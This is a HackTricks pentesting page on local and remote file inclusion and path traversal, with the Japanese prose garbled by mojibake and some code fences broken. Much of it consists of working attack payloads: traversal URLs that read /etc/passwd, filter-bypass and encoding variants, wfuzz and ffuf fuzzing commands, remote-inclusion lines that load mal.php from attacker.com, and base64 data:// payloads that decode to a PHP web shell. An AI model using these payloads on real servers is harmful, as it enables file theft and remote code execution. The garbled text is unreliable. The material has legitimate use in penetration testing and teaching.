# ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³/ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼šç¤¾**ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ**HackTricksã§ä¼šç¤¾ã®åºƒå‘Šã‚’è¦‹ãŸã„**ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹**ã—ãŸã‚Šã€**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ã”è¦§ãã ã•ã„ã€‚
* [**å…¬å¼ã®PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã—ã¦ãã ã•ã„ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã‚„[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ ã™ã‚‹ã‹**ã€**Twitter**ã§ç§ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* [**hacktricksãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨æŒ‘æˆ¦ã«ç„¦ç‚¹ã‚’å½“ã¦ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã™ã‚‹

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€é€Ÿã„ãƒšãƒ¼ã‚¹ã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã«è¿½ã„ã¤ã

**æœ€æ–°ã®ã‚¢ãƒŠã‚¦ãƒ³ã‚¹ãƒ¡ãƒ³ãƒˆ**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°æƒ…å ±ã‚’å…¥æ‰‹ã™ã‚‹

**Discord**ã«[**å‚åŠ ã™ã‚‹**](https://discord.com/invite/N3FrSbmwdy)ã¨ã€ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨å”åŠ›ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

## ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

**ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ (RFI):** ãƒ•ã‚¡ã‚¤ãƒ«ã¯ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã¾ã™ï¼ˆæœ€é©: ã‚³ãƒ¼ãƒ‰ã‚’æ›¸ã„ã¦ã‚µãƒ¼ãƒãƒ¼ãŒå®Ÿè¡Œã—ã¾ã™ï¼‰ã€‚phpã§ã¯ã“ã‚Œã¯ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§**ç„¡åŠ¹**ã§ã™ï¼ˆ**allow\_url\_include**ï¼‰ã€‚\
**ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ (LFI):** ã‚µãƒ¼ãƒãƒ¼ã¯ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ãƒ­ãƒ¼ãƒ‰ã—ã¾ã™ã€‚

ã“ã®è„†å¼±æ€§ã¯ã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒä½•ã‚‰ã‹ã®æ–¹æ³•ã§ã‚µãƒ¼ãƒãƒ¼ã«ã‚ˆã£ã¦ãƒ­ãƒ¼ãƒ‰ã•ã‚Œã‚‹ãƒ•ã‚¡ã‚¤ãƒ«ã‚’åˆ¶å¾¡ã§ãã‚‹å ´åˆã«ç™ºç”Ÿã—ã¾ã™ã€‚

è„†å¼±ãª**PHPé–¢æ•°**: require, require\_once, include, include\_once

ã“ã®è„†å¼±æ€§ã‚’åˆ©ç”¨ã™ã‚‹ãŸã‚ã®èˆˆå‘³æ·±ã„ãƒ„ãƒ¼ãƒ«: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## ç›²ç›® - èˆˆå‘³æ·±ã„ - LFI2RCEãƒ•ã‚¡ã‚¤ãƒ«
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**ã„ãã¤ã‹ã®\*nix LFIãƒªã‚¹ãƒˆã‚’æ··åˆã—ã€ã•ã‚‰ã«ãƒ‘ã‚¹ã‚’è¿½åŠ ã—ã¦ã€ã“ã®ãƒªã‚¹ãƒˆã‚’ä½œæˆã—ã¾ã—ãŸï¼š**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

`/`ã‚’`\`ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„ã€‚\
ã¾ãŸã€`../../../../../`ã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

/etc/passwordãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ãƒªã‚¹ãƒˆï¼ˆè„†å¼±æ€§ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ï¼‰ã¯[ã“ã¡ã‚‰](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **Windows**

ã„ãã¤ã‹ã®ãƒªã‚¹ãƒˆã‚’çµ±åˆã—ã¦ã€ä»¥ä¸‹ã‚’ä½œæˆã—ã¾ã—ãŸï¼š

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

`/`ã‚’`\`ã«å¤‰æ›´ã—ã¦ã¿ã¦ãã ã•ã„ã€‚\
ã¾ãŸã€`C:/`ã‚’å‰Šé™¤ã—ã€`../../../../../`ã‚’è¿½åŠ ã—ã¦ã¿ã¦ãã ã•ã„ã€‚

/boot.iniãƒ•ã‚¡ã‚¤ãƒ«ã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã„ãã¤ã‹ã®æŠ€è¡“ã‚’ä½¿ç”¨ã™ã‚‹ãƒªã‚¹ãƒˆï¼ˆè„†å¼±æ€§ãŒå­˜åœ¨ã™ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã™ã‚‹ãŸã‚ï¼‰ã¯[ã“ã¡ã‚‰](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)ã§è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### **OS X**

Linuxã®LFIãƒªã‚¹ãƒˆã‚’ç¢ºèªã—ã¦ãã ã•ã„ã€‚

## åŸºæœ¬çš„ãªLFIã¨ãƒã‚¤ãƒ‘ã‚¹

ã™ã¹ã¦ã®ä¾‹ã¯Local File Inclusionã«å¯¾ã—ã¦ã§ã™ãŒã€Remote File Inclusionã«ã‚‚é©ç”¨å¯èƒ½ã§ã™ï¼ˆä¾‹ï¼špage=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/ï¼‰ã€‚
```
http://example.com/index.php?page=../../../etc/passwd
```
### ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ãŒéå†å¸°çš„ã«å‰¥ãŒã•ã‚Œã‚‹
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

æä¾›ã•ã‚ŒãŸæ–‡å­—åˆ—ã®æœ«å°¾ã«è¿½åŠ ã•ã‚Œã‚‹æ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ï¼ˆãƒã‚¤ãƒ‘ã‚¹å¯¾è±¡ï¼š$\_GET\['param']."php"ï¼‰
```
http://example.com/index.php?page=../../../etc/passwd%00
```
This is **PHP 5.4ä»¥é™ã§è§£æ±ºæ¸ˆã¿ã§ã™**

### **ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°**

éæ¨™æº–ã®ã‚¨ãƒ³ã‚³ãƒ¼ãƒ‡ã‚£ãƒ³ã‚°ã‚’ä½¿ç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ä¾‹ãˆã°ã€ãƒ€ãƒ–ãƒ«URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ï¼ˆãã®ä»–ã‚‚ã‚ã‚Šã¾ã™ï¼‰ï¼š
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### æ—¢å­˜ã®ãƒ•ã‚©ãƒ«ãƒ€ã‹ã‚‰

ãƒãƒƒã‚¯ã‚¨ãƒ³ãƒ‰ãŒãƒ•ã‚©ãƒ«ãƒ€ãƒ‘ã‚¹ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ã„ã‚‹ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ï¼š
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### ã‚µãƒ¼ãƒãƒ¼ä¸Šã®ãƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‚’ç‰¹å®šã™ã‚‹

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚³ãƒ¼ãƒ‰ã‚„è¨±å¯ã•ã‚ŒãŸæ–‡å­—ã«ã‚ˆã£ã¦ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã ã‘ã§ãªããƒ•ã‚©ãƒ«ãƒ€ãƒ¼ã‚’å†å¸°çš„ã«æ¢ç´¢ã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã‚’æ¢ã‚‹ã“ã¨ãŒå¯èƒ½ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚ã“ã‚Œã‚’è¡Œã†ãŸã‚ã«ã¯ï¼š

* ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ã€Œæ·±ã•ã€ã‚’ã€Linuxä¸Šã§ã‚ã‚Œã° `/etc/passwd` ã‚’æˆåŠŸè£ã«å–å¾—ã™ã‚‹ã“ã¨ã§ç‰¹å®šã—ã¾ã™ï¼š
```
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
* ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«ã‚ã‚‹ãƒ•ã‚©ãƒ«ãƒ€åã‚’æ¨æ¸¬ã—ã¦è¿½åŠ ã—ã¾ã™ï¼ˆã“ã“ã§ã¯ã€`private`ï¼‰ã€ãã—ã¦ `/etc/passwd` ã«æˆ»ã‚Šã¾ã™ï¼š
```
http://example.com/index.php?page=private/../../../../etc/passwd # we went deeper down one level, so we have to go 3+1=4 levels up to go back to /etc/passwd
```
* ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ãŒè„†å¼±ã§ã‚ã‚‹å ´åˆã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆã«ã¯2ã¤ã®ç•°ãªã‚‹çµæœãŒç”Ÿã˜ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
* ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã™ã‚‹ã‹å‡ºåŠ›ãŒãªã„å ´åˆã€`private` ãƒ•ã‚©ãƒ«ãƒ€ã¯ã“ã®å ´æ‰€ã«å­˜åœ¨ã—ã¾ã›ã‚“
* `/etc/passwd` ã®å†…å®¹ãŒè¡¨ç¤ºã•ã‚ŒãŸå ´åˆã€ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å®Ÿéš›ã« `private` ãƒ•ã‚©ãƒ«ãƒ€ãŒã‚ã‚‹ã“ã¨ãŒç¢ºèªã•ã‚Œã¾ã™
* ã“ã®æŠ€è¡“ã‚’ä½¿ç”¨ã—ã¦ç™ºè¦‹ã—ãŸãƒ•ã‚©ãƒ«ãƒ€ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã«å¯¾ã—ã¦ï¼ˆå¾“æ¥ã®LFIãƒ¡ã‚½ãƒƒãƒ‰ã‚’ä½¿ç”¨ã—ã¦ï¼‰ãƒ•ã‚¡ã‚¸ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã¾ãŸã¯ã€åŒã˜æŠ€è¡“ã‚’å†å¸°çš„ã«ä½¿ç”¨ã—ã¦ã‚µãƒ–ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«å¯¾ã—ã¦ãƒ•ã‚¡ã‚¸ãƒ³ã‚°ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã“ã®æŠ€è¡“ã¯ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ å†…ã®ä»»æ„ã®å ´æ‰€ã«ã‚ã‚‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«é©å¿œã•ã›ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ä¾‹ãˆã°ã€åŒã˜ä»®å®šï¼ˆãƒ•ã‚¡ã‚¤ãƒ«ã‚·ã‚¹ãƒ†ãƒ ã®æ·±ã•3ã§ã®ç¾åœ¨ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªï¼‰ã®ä¸‹ã§ã€`/var/www/` ã« `private` ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãŒå«ã¾ã‚Œã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ãŸã„å ´åˆã€ä»¥ä¸‹ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ä½¿ç”¨ã—ã¾ã™ï¼š
```
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
ä»¥ä¸‹ã®ã‚³ãƒãƒ³ãƒ‰ã‚·ãƒ¼ã‚±ãƒ³ã‚¹ã¯ã€`sed` (1) ã‚’ä½¿ç”¨ã—ã¦ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ç”Ÿæˆã—ã€`ffuf` (2) ã®ã‚ˆã†ãªURLãƒ•ã‚¡ã‚¸ãƒ³ã‚°ãƒ„ãƒ¼ãƒ«ã®å…¥åŠ›ã¨ã—ã¦åˆ©ç”¨ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼š
```
$ sed 's_^_../../../var/www/_g' /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt | sed 's_$_/../../../etc/passwd_g' > payloads.txt
$ ffuf -u http://example.com/index.php?page=FUZZ -w payloads.txt -mr "root"
$ ffuf -u http://owasp.ctf.intigriti.io/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -mc 200 -e '.php~,.php.old,.php.bak,.php.swp,.php.sav,.php.save'
```
ã‚‚ã¡ã‚ã‚“ã€æ·±ã•/å ´æ‰€/å…¥åŠ›ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªãƒªã‚¹ãƒˆã«é–¢ã—ã¦ã¯ã€ã“ã‚Œã‚‰ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’ã”è‡ªèº«ã®ãƒ‹ãƒ¼ã‚ºã«åˆã‚ã›ã¦èª¿æ•´ã—ã¦ãã ã•ã„ã€‚

### **ãƒ‘ã‚¹åˆ‡ã‚Šæ¨ã¦**

æä¾›ã•ã‚ŒãŸæ–‡å­—åˆ—ã®æœ«å°¾ã«è¿½åŠ ã•ã‚Œã‚‹æ–‡å­—ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¾ã™ï¼ˆãƒã‚¤ãƒ‘ã‚¹å¯¾è±¡: $\_GET\['param']."php"ï¼‰ã€‚
```
In PHP: /etc/passwd = /etc//passwd = /etc/./passwd = /etc/passwd/ = /etc/passwd/.
Check if last 6 chars are passwd --> passwd/
Check if last 4 chars are ".php" --> shellcode.php/.
```

```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd..\.\.\.\.\.\.\.\.\.\.\[ADD MORE]\.\.
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.

#With the next options, by trial and error, you have to discover how many "../" are needed to delete the appended string but not "/etc/passwd" (near 2027)

http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
```
å¸¸ã«**å½ã®ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒª**ï¼ˆa/ï¼‰ã‚’ä½¿ã£ã¦ãƒ‘ã‚¹ã‚’**é–‹å§‹**ã—ã¦ãã ã•ã„ã€‚

**ã“ã®è„†å¼±æ€§ã¯PHP 5.3ã§ä¿®æ­£ã•ã‚Œã¾ã—ãŸã€‚**

### **ãƒ•ã‚£ãƒ«ã‚¿ãƒã‚¤ãƒ‘ã‚¹ã®ã‚³ãƒ„**
```
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## ãƒªãƒ¢ãƒ¼ãƒˆãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³

phpã§ã¯ã€**`allow_url_include`** ãŒ**ã‚ªãƒ•**ã«ãªã£ã¦ã„ã‚‹ãŸã‚ã€ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆã§ã¯ç„¡åŠ¹ã§ã™ã€‚ã“ã‚ŒãŒ**ã‚ªãƒ³**ã«ãªã£ã¦ã„ã‚‹å ´åˆã€ã‚µãƒ¼ãƒãƒ¼ã‹ã‚‰PHPãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ãƒ‰ã—ã¦RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
ä½•ã‚‰ã‹ã®ç†ç”±ã§ **`allow_url_include`** ãŒ **On** ã«ãªã£ã¦ã„ã‚‹ãŒã€PHPãŒå¤–éƒ¨ã‚¦ã‚§ãƒ–ãƒšãƒ¼ã‚¸ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’**ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°**ã—ã¦ã„ã‚‹å ´åˆã€[ã“ã®æŠ•ç¨¿ã«ã‚ˆã‚‹ã¨](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/)ã€ä¾‹ãˆã°ãƒ‡ãƒ¼ã‚¿ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã¨base64ã‚’ä½¿ç”¨ã—ã¦b64 PHPã‚³ãƒ¼ãƒ‰ã‚’ãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã€RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
å‰ã®ã‚³ãƒ¼ãƒ‰ã§ã¯ã€æ”»æ’ƒè€…ãŒ`.txt`ã§çµ‚ã‚ã‚‹æ–‡å­—åˆ—ãŒå¿…è¦ã ã£ãŸãŸã‚ã€æœ€å¾Œã«`+.txt`ãŒè¿½åŠ ã•ã‚Œã¾ã—ãŸã€‚ãã®ãŸã‚ã€æ–‡å­—åˆ—ã¯ãã‚Œã§çµ‚ã‚ã‚Šã€b64ãƒ‡ã‚³ãƒ¼ãƒ‰å¾Œã«ãã®éƒ¨åˆ†ã¯å˜ãªã‚‹ã‚´ãƒŸã¨ãªã‚Šã€å®Ÿéš›ã®PHPã‚³ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œï¼ˆãã—ã¦å®Ÿè¡Œã•ã‚Œã‚‹ï¼‰ã“ã¨ã«ãªã‚Šã¾ã™ã€‚
{% endhint %}

`php://`ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’**ä½¿ç”¨ã—ãªã„**åˆ¥ã®ä¾‹ã¯ä»¥ä¸‹ã®é€šã‚Šã§ã™ï¼š

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python ãƒ«ãƒ¼ãƒˆè¦ç´ 

Pythonã§ã¯ã€ã“ã®ã‚ˆã†ãªã‚³ãƒ¼ãƒ‰ã§ï¼š
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**`file_name`**ã«**çµ¶å¯¾ãƒ‘ã‚¹**ã‚’æ¸¡ã™ã¨ã€**ä»¥å‰ã®ãƒ‘ã‚¹ã¯å˜ã«å‰Šé™¤ã•ã‚Œã¾ã™**ï¼š
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
ä»¥ä¸‹ã¯ã€[ãƒ‰ã‚­ãƒ¥ãƒ¡ãƒ³ãƒˆ](https://docs.python.org/3.10/library/os.path.html#os.path.join)ã«ã‚ˆã‚‹ã¨æ„å›³ã•ã‚ŒãŸæŒ™å‹•ã§ã™ï¼š

> ã‚‚ã—ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆãŒçµ¶å¯¾ãƒ‘ã‚¹ã§ã‚ã‚Œã°ã€ãã‚Œä»¥å‰ã®å…¨ã¦ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã¯ç ´æ£„ã•ã‚Œã€çµ¶å¯¾ãƒ‘ã‚¹ã®ã‚³ãƒ³ãƒãƒ¼ãƒãƒ³ãƒˆã‹ã‚‰çµåˆãŒç¶šè¡Œã•ã‚Œã¾ã™ã€‚

## Java ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªä¸€è¦§

Javaã§ãƒ‘ã‚¹ãƒˆãƒ©ãƒãƒ¼ã‚µãƒ«ãŒç™ºç”Ÿã—ã€**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã‚’è¦æ±‚ã™ã‚‹**ã¨ã€ãƒ•ã‚¡ã‚¤ãƒ«ã§ã¯ãªã**ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã®ãƒªã‚¹ãƒˆãŒè¿”ã•ã‚Œã‚‹**ã‚ˆã†ã§ã™ã€‚ä»–ã®è¨€èªã§ã¯ï¼ˆafaikï¼‰ã“ã®ã‚ˆã†ãªã“ã¨ã¯èµ·ã“ã‚Šã¾ã›ã‚“ã€‚

## ãƒˆãƒƒãƒ—25ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼

ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã‚¤ãƒ³ã‚¯ãƒ«ãƒ¼ã‚¸ãƒ§ãƒ³ï¼ˆLFIï¼‰ã®è„†å¼±æ€§ã«å¯¾ã—ã¦è„†å¼±ã§ã‚ã‚‹å¯èƒ½æ€§ãŒã‚ã‚‹ãƒˆãƒƒãƒ—25ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ãƒ¼ã®ãƒªã‚¹ãƒˆã¯ã“ã¡ã‚‰ã§ã™ï¼ˆ[ãƒªãƒ³ã‚¯](https://twitter.com/trbughunters/status/1279768631845494787)ã‚ˆã‚Šï¼‰ï¼š
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI ã‚’ PHP ãƒ©ãƒƒãƒ‘ãƒ¼ã¨ãƒ—ãƒ­ãƒˆã‚³ãƒ«ã‚’ä½¿ç”¨ã—ã¦è¡Œã†

### php://filter

PHP ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã¯ã€ãƒ‡ãƒ¼ã‚¿ãŒèª­ã¿æ›¸ãã•ã‚Œã‚‹å‰ã«åŸºæœ¬çš„ãª**å¤‰æ›´æ“ä½œã‚’è¡Œã†**ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼ã«ã¯5ã¤ã®ã‚«ãƒ†ã‚´ãƒªãƒ¼ãŒã‚ã‚Šã¾ã™ï¼š

* [æ–‡å­—åˆ—ãƒ•ã‚£ãƒ«ã‚¿ãƒ¼](https://www.php.net/manual/ja/filters.string.php):
* `string.rot13`
